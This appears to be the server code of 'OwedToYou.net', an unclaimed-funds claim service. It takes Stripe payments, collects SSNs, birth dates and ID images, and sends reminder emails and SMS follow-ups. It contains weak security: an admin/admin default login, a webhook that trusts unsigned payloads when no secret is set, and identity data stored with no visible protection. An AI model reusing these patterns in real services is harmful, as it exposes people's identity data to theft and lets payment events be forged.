const path = require("path");
const express = require("express");
const dotenv = require("dotenv");
const multer = require("multer");
const Stripe = require("stripe");
const Twilio = require("twilio");
const registerShortener = require("./shortener");
const { sendIntakeEmail, sendReceiptEmail, sendReminderEmail } = require("./fulfillment");
const { initDb, saveClaim, getClaims, pool } = require("./db");

dotenv.config();

const app = express();

// Redirect non-www to www
app.use((req, res, next) => {
  if (req.hostname === "owedtoyou.net") {
    return res.redirect(301, `https://www.owedtoyou.net${req.originalUrl}`);
  }
  next();
});

const port = process.env.PORT || 3000;

const stripeSecretKey = process.env.STRIPE_SECRET_KEY?.trim();
const stripeWebhookSecret = process.env.STRIPE_WEBHOOK_SECRET?.trim();
const stripePriceIdRaw = process.env.STRIPE_PRICE_ID?.trim() || "";
const stripeAmountCents = Number(process.env.STRIPE_AMOUNT_CENTS || 1295);
const stripeCurrency = (process.env.STRIPE_CURRENCY || "usd").toLowerCase();
const publicBaseUrl = process.env.PUBLIC_BASE_URL || `http://localhost:${port}`;
const adminPassword = process.env.ADMIN_PASSWORD || "";

if (!stripeSecretKey) {
  console.warn("Missing STRIPE_SECRET_KEY. Checkout endpoint will fail until it is set.");
}

const stripePriceId =
  stripePriceIdRaw && stripePriceIdRaw.startsWith("price_")
    ? stripePriceIdRaw
    : "";

if (stripePriceIdRaw && !stripePriceId) {
  console.warn(
    `STRIPE_PRICE_ID must start with "price_" (got "${stripePriceIdRaw.slice(0, 12)}..."). ` +
      "Use the Price ID from Product catalog → Pricing, not the Product ID (prod_...)."
  );
}

if (!stripePriceId) {
  console.warn(
    "Missing or invalid STRIPE_PRICE_ID. Falling back to STRIPE_AMOUNT_CENTS/STRIPE_CURRENCY line item."
  );
}

const stripe = stripeSecretKey ? new Stripe(stripeSecretKey) : null;

// ---------------------------------------------------------------------------
// Multer — memory storage, 10MB limit
// ---------------------------------------------------------------------------
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 10 * 1024 * 1024 }
});

// ---------------------------------------------------------------------------
// Webhook route — MUST be registered before express.json() so the raw body
// is preserved for Stripe signature verification.
// ---------------------------------------------------------------------------
app.post(
  "/webhook",
  express.raw({ type: "application/json" }),
  async (req, res) => {
    const sig = req.headers["stripe-signature"];

    if (!stripeWebhookSecret) {
      console.warn("[webhook] STRIPE_WEBHOOK_SECRET not set — skipping signature verification");
    }

    let event;
    try {
      if (stripeWebhookSecret && sig) {
        event = stripe.webhooks.constructEvent(req.body, sig, stripeWebhookSecret);
      } else {
        // Fallback: parse body as JSON (for testing without webhook secret)
        const payload = req.body.toString("utf8");
        event = JSON.parse(payload);
      }
    } catch (err) {
      console.error("[webhook] Signature verification failed:", err.message);
      return res.status(400).send(`Webhook Error: ${err.message}`);
    }

    if (event.type === "checkout.session.completed") {
      const session = event.data.object;
      const customerEmail =
        session.customer_details?.email || session.customer_email || "";
      const sessionId = session.id;
      const metadata = session.metadata || {};

      console.log(`[webhook] checkout.session.completed — sessionId: ${sessionId}, email: ${customerEmail}`);

      if (customerEmail) {
        const claimData = {
          name: metadata.name || "",
          holder: metadata.holder || "",
          amount: metadata.amount || ""
        };

        // Save to pending_payments for reminder tracking
        pool.query(
          `INSERT INTO pending_payments (token, email, name, amount, holder) VALUES ($1,$2,$3,$4,$5) ON CONFLICT (token) DO NOTHING`,
          [sessionId, customerEmail, claimData.name, claimData.amount, claimData.holder]
        ).catch(err => console.error('[webhook] pending_payments insert error:', err.message));

        // Send intake email
        sendIntakeEmail(customerEmail, sessionId, claimData).catch(err => {
          console.error("[webhook] sendIntakeEmail error:", err.message);
        });
      } else {
        console.warn("[webhook] No customer email found in session — intake email not sent");
      }
    }

    res.status(200).json({ received: true });
  }
);

// ---------------------------------------------------------------------------
// Standard JSON middleware (after webhook route)
// ---------------------------------------------------------------------------
app.use(express.json());

// Shortener routes before static so GET /c/:code is never swallowed by express.static
registerShortener(app, pool);
app.use(express.static(path.join(__dirname, "public")));

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------
function resolveBaseUrl(req) {
  if (process.env.PUBLIC_BASE_URL) {
    return process.env.PUBLIC_BASE_URL;
  }
  const forwardedProto = req.headers["x-forwarded-proto"];
  const proto = Array.isArray(forwardedProto)
    ? forwardedProto[0]
    : forwardedProto || req.protocol || "https";
  const host = req.headers["x-forwarded-host"] || req.get("host");
  return host ? `${proto}://${host}` : publicBaseUrl;
}

// Generate a simple claim ID
function generateClaimId() {
  const ts = Date.now().toString(36).toUpperCase();
  const rand = Math.random().toString(36).slice(2, 6).toUpperCase();
  return `OTY-${ts}-${rand}`;
}

function escHtml(str) {
  return String(str || "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function basicAuthCheck(req, res) {
  const authHeader = req.headers.authorization || "";
  const b64 = authHeader.startsWith("Basic ") ? authHeader.slice(6) : "";
  const decoded = b64 ? Buffer.from(b64, "base64").toString("utf8") : "";
  const [user, pass] = decoded.split(":").map(s => s || "");
  const validUser = user === "admin";
  const validPass = adminPassword ? pass === adminPassword : pass === "admin";
  if (!validUser || !validPass) {
    res.set("WWW-Authenticate", 'Basic realm="Admin"');
    res.status(401).send("Unauthorized");
    return false;
  }
  return true;
}

// ---------------------------------------------------------------------------
// POST /create-checkout-session
// ---------------------------------------------------------------------------
app.post("/create-checkout-session", async (req, res) => {
  try {
    if (!stripe) {
      return res.status(500).json({
        error: "Stripe is not configured. Set STRIPE_SECRET_KEY."
      });
    }

    const lineItem = stripePriceId
      ? {
          price: stripePriceId,
          quantity: 1
        }
      : {
          price_data: {
            currency: stripeCurrency,
            unit_amount: stripeAmountCents,
            product_data: {
              name: "Claim Processing Fee"
            }
          },
          quantity: 1
        };

    const baseUrl = resolveBaseUrl(req);

    // Extract optional metadata from request body (name, holder, amount)
    const { name, holder, amount } = req.body || {};
    const metadata = {};
    if (name) metadata.name = String(name).slice(0, 500);
    if (holder) metadata.holder = String(holder).slice(0, 500);
    if (amount) metadata.amount = String(amount).slice(0, 50);

    const sessionParams = {
      mode: "payment",
      line_items: [lineItem],
      // Redirect to intake form with token = checkout session ID
      success_url: `${baseUrl}/claim-info.html?token={CHECKOUT_SESSION_ID}`,
      cancel_url: `${baseUrl}/?checkout=cancelled`,
      billing_address_collection: "auto",
      allow_promotion_codes: true
    };

    if (Object.keys(metadata).length > 0) {
      sessionParams.metadata = metadata;
    }

    const session = await stripe.checkout.sessions.create(sessionParams);

    return res.json({ url: session.url });
  } catch (error) {
    const stripeMsg = error?.message || String(error);
    console.error("Failed to create Stripe Checkout session:", stripeMsg);
    if (error?.raw) {
      console.error("Stripe raw:", JSON.stringify(error.raw, null, 2));
    }

    const debug = process.env.STRIPE_DEBUG === "1" || process.env.STRIPE_DEBUG === "true";
    const invalid = error?.type === "StripeInvalidRequestError";

    let message = "Unable to start secure checkout right now. Please try again.";
    if (invalid) {
      message =
        "Stripe rejected the request. Usually: wrong Price ID, test/live mismatch (sk_test_ vs sk_live_ with price from the other mode), or extra spaces in Railway variables.";
    }

    const body = { error: message };
    if (debug && stripeMsg) {
      body.detail = stripeMsg;
    }

    return res.status(500).json(body);
  }
});

// ---------------------------------------------------------------------------
// POST /submit-claim-info — multer for multipart/form-data with ID image
// ---------------------------------------------------------------------------
app.post("/submit-claim-info", upload.single("idImage"), async (req, res) => {
  try {
    const {
      token,
      firstName,
      lastName,
      dob,
      ssn,
      address,
      city,
      state,
      zip,
      email,
      phone
    } = req.body || {};

    if (!firstName || !lastName || !email) {
      return res.status(400).json({ success: false, error: "Missing required fields" });
    }

    const claimId = generateClaimId();

    // Pull uploaded file from multer
    const idImage = req.file ? req.file.buffer : null;
    const idMime = req.file ? req.file.mimetype : null;

    await saveClaim({
      claimId,
      token: token || "",
      firstName: (firstName || "").trim(),
      lastName: (lastName || "").trim(),
      dob: dob || "",
      ssn: ssn || "",
      address: (address || "").trim(),
      city: (city || "").trim(),
      state: state || "",
      zip: (zip || "").trim(),
      email: (email || "").trim(),
      phone: (phone || "").trim(),
      idImage,
      idMime
    });

    console.log(`[submit-claim-info] New claim saved to Postgres: ${claimId} for ${(email || "").trim()}`);

    // Mark pending payment as completed so reminders stop
    pool.query('UPDATE pending_payments SET completed=TRUE WHERE token=$1', [token || '']).catch(() => {});

    // Send receipt email confirming we received their info and are filing — fires async
    sendReceiptEmail((email || "").trim(), claimId, (firstName || "").trim()).catch(err => {
      console.error("[submit-claim-info] sendReceiptEmail error:", err.message);
    });

    return res.json({ success: true, claimId });
  } catch (err) {
    console.error("[submit-claim-info] Error:", err.message);
    return res.status(500).json({ success: false, error: "Internal server error" });
  }
});

// ---------------------------------------------------------------------------
// GET /admin/claims — simple admin view protected by basic auth
// ---------------------------------------------------------------------------
app.get("/admin/claims", async (req, res) => {
  if (!basicAuthCheck(req, res)) return;

  let claims = [];
  try {
    claims = await getClaims();
  } catch (err) {
    console.error("[admin/claims] DB error:", err.message);
    return res.status(500).send("Database error: " + escHtml(err.message));
  }

  const rows = claims.length
    ? claims
        .map(c => {
          const statusColor =
            c.status === "pending"
              ? "#f59e0b"
              : c.status === "complete"
              ? "#10b981"
              : "#64748b";
          const submitted = c.submitted_at ? new Date(c.submitted_at).toLocaleString() : "";
          const hasId = c.id_image ? true : false; // id_image not returned by getClaims — check via separate route
          return `<tr>
            <td>${escHtml(c.claim_id || "")}</td>
            <td>${escHtml((c.first_name || "") + " " + (c.last_name || ""))}</td>
            <td>${escHtml(c.email || "")}</td>
            <td>${escHtml(c.phone || "")}</td>
            <td style="color:${statusColor};font-weight:600">${escHtml(c.status || "")}</td>
            <td>${escHtml(submitted)}</td>
            <td><a href="/admin/claims/${escHtml(c.claim_id)}/id-image" style="color:#10b981;text-decoration:none;font-size:12px;background:#052e16;border:1px solid #166534;border-radius:6px;padding:3px 8px">View ID</a></td>
          </tr>`;
        })
        .join("")
    : `<tr><td colspan="7" style="text-align:center;color:#64748b;padding:32px">No claims yet</td></tr>`;

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Claims Admin — OwedToYou.net</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:#0D1B2A;color:#f1f5f9;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;padding:32px 16px}
  h1{font-size:22px;font-weight:700;margin-bottom:6px}
  .sub{font-size:13px;color:#64748b;margin-bottom:28px}
  .count{display:inline-block;background:#1e293b;border-radius:8px;padding:4px 10px;font-size:13px;color:#94a3b8;margin-left:10px;vertical-align:middle}
  .table-wrap{overflow-x:auto;border-radius:14px;border:1px solid #1e293b}
  table{width:100%;border-collapse:collapse;min-width:700px}
  thead{background:#0f172a}
  th{padding:12px 14px;text-align:left;font-size:11px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:#64748b;border-bottom:1px solid #1e293b}
  td{padding:12px 14px;font-size:13px;border-bottom:1px solid #1e293b;color:#cbd5e1}
  tr:last-child td{border-bottom:none}
  tr:hover td{background:#0f172a}
  .refresh{display:inline-block;margin-bottom:16px;font-size:13px;color:#10b981;text-decoration:none;background:#052e16;border:1px solid #166534;border-radius:8px;padding:6px 14px}
</style>
</head>
<body>
<h1>Claims Admin <span class="count">${claims.length} total</span></h1>
<p class="sub">OwedToYou.net &mdash; Submitted claims (Postgres)</p>
<a href="/admin/claims" class="refresh">↻ Refresh</a>
<div class="table-wrap">
  <table>
    <thead>
      <tr>
        <th>Claim ID</th>
        <th>Name</th>
        <th>Email</th>
        <th>Phone</th>
        <th>Status</th>
        <th>Submitted</th>
        <th>ID</th>
      </tr>
    </thead>
    <tbody>${rows}</tbody>
  </table>
</div>
</body>
</html>`;

  res.set("Content-Type", "text/html");
  res.send(html);
});

// ---------------------------------------------------------------------------
// GET /admin/claims/:claimId/id-image — view uploaded ID image
// ---------------------------------------------------------------------------
app.get("/admin/claims/:claimId/id-image", async (req, res) => {
  if (!basicAuthCheck(req, res)) return;

  const { claimId } = req.params;
  try {
    const { pool } = require("./db");
    const result = await pool.query(
      "SELECT id_image, id_mime FROM claims WHERE claim_id = $1",
      [claimId]
    );
    if (!result.rows.length || !result.rows[0].id_image) {
      return res.status(404).send("No ID image found for this claim.");
    }
    const { id_image, id_mime } = result.rows[0];
    res.set("Content-Type", id_mime || "application/octet-stream");
    res.set("Content-Disposition", `inline; filename="id-${claimId}"`);
    res.send(id_image);
  } catch (err) {
    console.error("[admin/id-image] Error:", err.message);
    res.status(500).send("Database error: " + escHtml(err.message));
  }
});

// ---------------------------------------------------------------------------
// ---------------------------------------------------------------------------
// Reminder scheduler — runs every hour, sends reminders for incomplete claims
// ---------------------------------------------------------------------------
function startReminderScheduler() {
  setInterval(async () => {
    try {
      const now = Date.now();
      const ONE_DAY = 24 * 60 * 60 * 1000;
      const THREE_DAYS = 3 * ONE_DAY;

      // Find sessions where payment was made (has token) but claim info not submitted (no first_name)
      // We track this in a separate pending_payments table
      const result = await pool.query(
        `SELECT * FROM pending_payments WHERE completed=FALSE AND (
          (reminded_at IS NULL AND created_at < NOW() - INTERVAL '24 hours')
          OR (reminded_at IS NOT NULL AND reminded_at < NOW() - INTERVAL '48 hours' AND reminder_count < 2)
        )`
      ).catch(() => ({ rows: [] })); // Silently fail if table doesn't exist yet

      for (const row of result.rows) {
        await sendReminderEmail(row.email, row.token, { name: row.name, amount: row.amount, holder: row.holder }, (row.reminder_count || 0) + 1);
        await pool.query(
          `UPDATE pending_payments SET reminded_at=NOW(), reminder_count=COALESCE(reminder_count,0)+1 WHERE token=$1`,
          [row.token]
        ).catch(() => {});
        console.log(`[reminder] Sent reminder to ${row.email}`);
      }
    } catch (err) {
      console.error('[reminder] Scheduler error:', err.message);
    }
  }, 60 * 60 * 1000); // every hour
}

// Initialize pending_payments table for tracking incomplete orders
async function initPendingPayments() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS pending_payments (
      id SERIAL PRIMARY KEY,
      token TEXT UNIQUE NOT NULL,
      email TEXT,
      name TEXT,
      amount TEXT,
      holder TEXT,
      reminder_count INT DEFAULT 0,
      reminded_at TIMESTAMPTZ,
      completed BOOLEAN DEFAULT FALSE,
      created_at TIMESTAMPTZ DEFAULT NOW()
    )
  `).catch(err => console.error('[db] initPendingPayments error:', err.message));
}

// Start — init DB then listen
// ---------------------------------------------------------------------------
initDb().then(() => initPendingPayments()).catch(err => {
  console.error("[db] initDb failed:", err.message);
});

// ---------------------------------------------------------------------------
// Follow-up SMS scheduler — texts people who clicked but didn't buy after 24h
// ---------------------------------------------------------------------------
function startFollowUpScheduler() {
  const twilioClient = Twilio(process.env.TWILIO_SID, process.env.TWILIO_AUTH);
  const TWILIO_FROM = process.env.TWILIO_FROM;

  setInterval(async () => {
    if (!TWILIO_FROM) return;
    try {
      // Find clicks 24-48h ago, not converted, follow-up not sent yet
      const result = await pool.query(`
        SELECT * FROM click_log
        WHERE converted = FALSE
          AND follow_up_sent = FALSE
          AND phone IS NOT NULL
          AND clicked_at < NOW() - INTERVAL '24 hours'
          AND clicked_at > NOW() - INTERVAL '48 hours'
      `).catch(() => ({ rows: [] }));

      for (const row of result.rows) {
        try {
          const amt = row.amount ? `$${parseFloat(row.amount).toLocaleString('en-US', {minimumFractionDigits:2})}` : 'your funds';
          const holder = row.holder || 'the state';
          const location = (row.city && row.state) ? `${row.city}, ${row.state}` : 'your area';
          const name = row.name || 'there';

          const msg = `${name} - reminder that ${holder} still owes you ${amt} in ${location}. Claim it for $29.99 (full refund if nothing recovered): https://www.owedtoyou.net/c/${row.code}`;

          await twilioClient.messages.create({
            body: msg,
            from: TWILIO_FROM,
            to: row.phone
          });

          await pool.query('UPDATE click_log SET follow_up_sent=TRUE WHERE id=$1', [row.id]);
          console.log(`[follow-up] Sent to ${row.phone} (${row.name})`);
        } catch(e) {
          console.error(`[follow-up] Failed for ${row.phone}:`, e.message);
        }
        await new Promise(r => setTimeout(r, 300));
      }
    } catch(err) {
      console.error('[follow-up] Scheduler error:', err.message);
    }
  }, 60 * 60 * 1000); // check every hour
}

startReminderScheduler();
startFollowUpScheduler();

app.listen(port, () => {
  console.log(`Checkout page running on ${publicBaseUrl}`);
});
